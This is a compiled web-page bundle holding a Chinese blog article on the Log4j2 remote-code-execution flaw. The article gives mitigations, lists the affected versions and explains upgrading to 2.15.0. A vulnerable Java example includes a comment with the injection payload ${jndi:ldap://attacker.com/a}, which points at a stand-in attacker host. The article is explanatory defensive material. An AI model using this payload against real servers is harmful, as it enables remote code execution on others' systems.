import{_ as n}from"./plugin-vue_export-helper.21dcd24c.js";import{o as s,c as a,e}from"./app.795d54da.js";const t={},p=e(`<p>\u957F\u8BDD\u77ED\u8BF4\u5427\u3002</p><p>\u76F8\u4FE1\u5927\u5BB6\u5DF2\u7ECF\u88AB Log4j2 \u7684\u91CD\u5927\u6F0F\u6D1E\u5237\u5C4F\u4E86\uFF0C\u4F30\u8BA1\u6709\u4E0D\u5C11\u5C0F\u4F19\u4F34\u6B64\u65F6\u6B64\u523B\u5DF2\u7ECF\u7D2F\u8DB4\u4E0B\u4E86\u3002\u5F88\u4E0D\u5E78\uFF0C\u6211\u7684\u5C0F\u8001\u5F1F\u5C0F\u4E8C\u7684 Spring Boot \u9879\u76EE\u4E2D\u6070\u597D\u7528\u7684\u5C31\u662F Log4j2\uFF0C\u7248\u672C\u7279\u55B5\u7684\u8FD8\u662F 2.14.1\uFF0C\u5728\u8FD9\u6B21\u6F0F\u6D1E\u6CE2\u53CA\u7684\u7248\u672C\u8303\u56F4\u4E4B\u5185\u3002</p><p>\u7B2C\u4E00\u65F6\u95F4\u4ECE\u7F51\u4E0A\u5F97\u77E5\u8FD9\u4E2A\u6F0F\u6D1E\u7684\u6D88\u606F\u540E\uFF0C\u5C0F\u4E8C\u5413\u5C3F\u4E86\u3002\u8D76\u7D27\u8DD1\u8FC7\u6765\u95EE\u8001\u738B\u600E\u4E48\u89E3\u51B3\u3002</p><p>\u8001\u738B\u5148\u662F\u7ED9\u5C0F\u4E8C\u63D0\u4F9B\u4E86\u4E00\u4E9B\u4E34\u65F6\u6027\u7684\u5EFA\u8BAE\uFF0C\u6BD4\u5982\u8BF4\uFF1A</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>JVM \u53C2\u6570\u6DFB\u52A0 -Dlog4j2.formatMsgNoLookups=true
log4j2.formatMsgNoLookups=True
FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS \u8BBE\u7F6E\u4E3Atrue
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u5E76\u4E14\u8001\u738B\u4E5F\u5728\u65F6\u523B\u7684\u5173\u6CE8\u7740 Log4j2 \u7684\u5B98\u7F51\u548C Spring Boot GitHub \u4ED3\u5E93\u7684\u6700\u65B0\u6D88\u606F\u3002</p><p>Java \u540E\u7AEF\u5F00\u53D1\u7684\u5C0F\u4F19\u4F34\u5E94\u8BE5\u90FD\u77E5\u9053\uFF0CLog4j\u3001SLF4J\u3001Logback \u8FD9 3 \u4E2A\u65E5\u5FD7\u7EC4\u4EF6\u662F\u4E00\u4E2A\u7239\u2014\u2014Ceki Gulcu\uFF0C\u4F46 Log4j 2 \u5374\u662F\u4F8B\u5916\uFF0C\u5B83\u662F Apache \u57FA\u91D1\u4F1A\u7684\u4EA7\u54C1\u3002</p><p>\u6240\u4EE5\u8FD9\u6CE2\u8D85\u7EA7\u9AD8\u5371\u6F0F\u6D1E\u7684\u9505\u5FC5\u987B\u5F97\u7531 Apache \u6765\u80CC\u3002\u5E76\u4E14\u6CE2\u53CA\u8303\u56F4\u975E\u5E38\u5E7F\uFF0C\u5DF2\u77E5\u53D7\u5F71\u54CD\u7684\u5E94\u7528\u7A0B\u5E8F\u548C\u7EC4\u4EF6\u6709\uFF1A</p><ul><li>Spring-boot-strater-log4j2</li><li>Apache Solr</li><li>Apache Flink</li><li>Apache Druid</li></ul><p>\u5E76\u4E14\u53EA\u8981\u662F\u5728 Log4j 2.x &lt;= 2.14.1 \u4E4B\u95F4\u7684\u7248\u672C\uFF0C\u90FD\u5C06\u53D7\u5230\u5F71\u54CD\u2014\u2014\u6CE8\u5B9A\u88AB\u8F7D\u5165\u53F2\u518C\u7684\u4E00\u6CE2 bug \u554A\u3002</p><p>\u76EE\u524D\uFF0CLog4j2 \u7684\u5B98\u7F51\u5DF2\u7ECF\u53D1\u5E03\u4E86 Log4j2 2.15.0 \u6B63\u5F0F\u7248\uFF0C\u6765\u89E3\u51B3\u6B64\u6B21\u6F0F\u6D1E\u3002</p><p><img src="http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/shigu/log4j2-01.png" alt=""></p><p>\u90A3\u968F\u7740 Log4j2 2.15.0 \u6B63\u5F0F\u7248\u7684\u53D1\u5E03\uFF0CSpring Boot \u7684 GitHub \u4ED3\u5E93\u63D0\u7684\u8FD9\u4E9B\u5173\u4E8E Log4j2 \u7684 issue \u90FD\u5DF2\u7ECF\u5904\u4E8E\u5173\u95ED\u72B6\u6001\u4E86\u3002</p><p><img src="http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/shigu/log4j2-02.png" alt=""></p><p>\u770B\u5230\u8FD9\u4E9B\u6D88\u606F\u540E\uFF0C\u8001\u738B\u7D27\u5F20\u7684\u60C5\u7EEA\u4E00\u4E0B\u5B50\u5C31\u7F13\u89E3\u4E86\u4E0B\u6765\uFF0C\u5C31\u50CF\u5403\u4E86\u4E00\u9897\u5B9A\u5FC3\u4E38\uFF0C\u8D76\u7D27\u53BB\u901A\u77E5\u5C0F\u4E8C\u4E0D\u7528\u518D\u63D0\u5FC3\u540A\u80C6\u4E86\uFF0C\u76F4\u63A5\u4E00\u884C\u4EE3\u7801\u641E\u5B9A\u3002</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>&lt;properties&gt;
    &lt;log4j2.version&gt;2.15.0&lt;/log4j2.version&gt;
&lt;/properties&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u8BE6\u60C5\u53EF\u53C2\u7167 Spring Boot \u5B98\u65B9\u8FD9\u7BC7\u535A\u5BA2\uFF1A</p><blockquote><p>https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot</p></blockquote><p>Gradle \u6784\u5EFA\u7684\u9879\u76EE\u4E5F\u6709\u89E3\u51B3\u65B9\u6848\u3002</p><p><img src="http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/shigu/log4j2-03.png" alt=""></p><p>\u95EE\u9898\u662F\u89E3\u51B3\u4E86\uFF0C\u4E0D\u8FC7\u8001\u738B\u6CA1\u95F2\u7740\u3002\u4ED6\u4ECE Log4j2 \u5B98\u7F51\u516C\u5E03\u7684\u6700\u65B0\u6D88\u606F\u4E2D\u7422\u78E8\u51FA\uFF0C\u672C\u6B21\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u6B63\u662F\u7531\u4E8E\u7EC4\u4EF6\u5B58\u5728 Java JNDI \u6CE8\u5165\u6F0F\u6D1E\uFF1A<strong>\u5F53\u7A0B\u5E8F\u5C06\u7528\u6237\u8F93\u5165\u7684\u6570\u636E\u8BB0\u5F55\u5230\u65E5\u5FD7\u65F6\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6784\u9020\u7279\u6B8A\u8BF7\u6C42\uFF0C\u6765\u89E6\u53D1 Apache Log4j2 \u4E2D\u7684\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF0C\u4ECE\u800C\u5229\u7528\u6B64\u6F0F\u6D1E\u5728\u76EE\u6807\u670D\u52A1\u5668\u4E0A\u6267\u884C\u4EFB\u610F\u4EE3\u7801</strong>\u3002</p><p>\u90A3\u80AF\u5B9A\u4F1A\u6709\u5C0F\u4F19\u4F34\u5728\u597D\u5947 JNDI \u662F\u4EC0\u4E48\u4E1C\u4E1C\uFF1F\u6765\u770B\u4E00\u4E0B\u7EF4\u57FA\u767E\u79D1\u7684\u89E3\u91CA\u3002</p><blockquote><p>Java\u547D\u540D\u548C\u76EE\u5F55\u63A5\u53E3\uFF08Java Naming and Directory Interface\uFF0C\u7F29\u5199JNDI\uFF09\uFF0C\u662FJava\u7684\u4E00\u4E2A\u76EE\u5F55\u670D\u52A1\u5E94\u7528\u7A0B\u5E8F\u63A5\u53E3\uFF08API\uFF09\uFF0C\u5B83\u63D0\u4F9B\u4E00\u4E2A\u76EE\u5F55\u7CFB\u7EDF\uFF0C\u5E76\u5C06\u670D\u52A1\u540D\u79F0\u4E0E\u5BF9\u8C61\u5173\u8054\u8D77\u6765\uFF0C\u4ECE\u800C\u4F7F\u5F97\u5F00\u53D1\u4EBA\u5458\u5728\u5F00\u53D1\u8FC7\u7A0B\u4E2D\u53EF\u4EE5\u4F7F\u7528\u540D\u79F0\u6765\u8BBF\u95EE\u5BF9\u8C61\u3002</p></blockquote><p>\u5229\u7528\u4E0B\u9762\u8FD9\u6BB5\u4EE3\u7801\uFF0C\u653B\u51FB\u8005\u53EF\u4EE5\u901A\u8FC7JNDI\u6765\u6267\u884CLDAP\u534F\u8BAE\u6765\u6CE8\u5165\u4E00\u4E9B\u975E\u6CD5\u7684\u53EF\u6267\u884C\u4EE3\u7801\u3002</p><div class="language-java ext-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">VulnerableLog4jExampleHandler</span> <span class="token keyword">implements</span> <span class="token class-name">HttpHandler</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token class-name">Logger</span> log <span class="token operator">=</span> <span class="token class-name">Logger</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>log4jExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token doc-comment comment">/**
     * A simple HTTP endpoint that reads the request&#39;s User Agent and logs it back.
     *
     * This is basically pseudo-code to explain the vulnerability, and not a full example.
     *
     * <span class="token keyword">@param</span> <span class="token parameter">he</span> HTTP Request Object
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token class-name">HttpExchange</span> he<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> userAgent <span class="token operator">=</span> he<span class="token punctuation">.</span><span class="token function">getRequestHeader</span><span class="token punctuation">(</span><span class="token string">&quot;user-agent&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.</span>
<span class="token comment">// The attacker can set their User-Agent header to: \${jndi:ldap://attacker.com/a}</span>
        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">&quot;Request User Agent:&quot;</span> <span class="token operator">+</span> userAgent<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> response <span class="token operator">=</span> <span class="token string">&quot;&lt;h1&gt;Hello There, &quot;</span> <span class="token operator">+</span> userAgent <span class="token operator">+</span> <span class="token string">&quot;!&lt;/h1&gt;&quot;</span><span class="token punctuation">;</span>
        he<span class="token punctuation">.</span><span class="token function">sendResponseHeaders</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">OutputStream</span> os <span class="token operator">=</span> he<span class="token punctuation">.</span><span class="token function">getResponseBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        os<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u5177\u4F53\u7684\u653B\u51FB\u624B\u6BB5\u53EF\u4EE5\u53C2\u8003\u8FD9\u91CC\uFF1A</p><blockquote><p>https://github.com/apache/pulsar/issues/13232</p></blockquote><p>\u4E0B\u56FE\u662F\u7A0B\u5E8F\u733F\u963F\u6717\u753B\u7684\u7B80\u5355\u7684\u653B\u51FB\u94FE\u8DEF\u6B65\u9AA4\u56FE\u3002</p><p><img src="http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/shigu/log4j2-04.png" alt=""></p><p>\u611F\u5174\u8DA3\u7684\u5C0F\u4F19\u4F34\u53EF\u4EE5\u5728\u672C\u5730\u590D\u73B0\u4E00\u4E0B\uFF0C\u4F46<strong>\u5343\u4E07\u4E0D\u8981\u4E0D\u5F53\u5229\u7528</strong>\u54E6\uFF01</p><p><img src="http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/shigu/log4j2-05.png" alt=""></p><p>\u518D\u6B21\u63D0\u9192\u5927\u5BB6\u4E00\u4E0B\uFF0C\u6392\u67E5\u81EA\u5DF1\u7684\u9879\u76EE\u662F\u5426\u5F15\u5165\u4E86 Apache log4j-core Jar \u5305\u3002</p><p><img src="http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/shigu/log4j2-06.png" alt=""></p><p>\u5982\u679C\u5B58\u5728\u4F9D\u8D56\u5F15\u5165\uFF0C\u4E14\u5728\u53D7\u5F71\u54CD\u7248\u672C\u8303\u56F4\u5185\uFF0C\u8BF7\u5347\u7EA7\u5230 Apache Log4j2 2.15.0 \u7248\u672C\uFF0C\u76EE\u524D\u5DF2\u7ECF release\u3002</p>`,34),o=[p];function c(l,i){return s(),a("div",null,o)}var d=n(t,[["render",c],["__file","log4j2.html.vue"]]);export{d as default};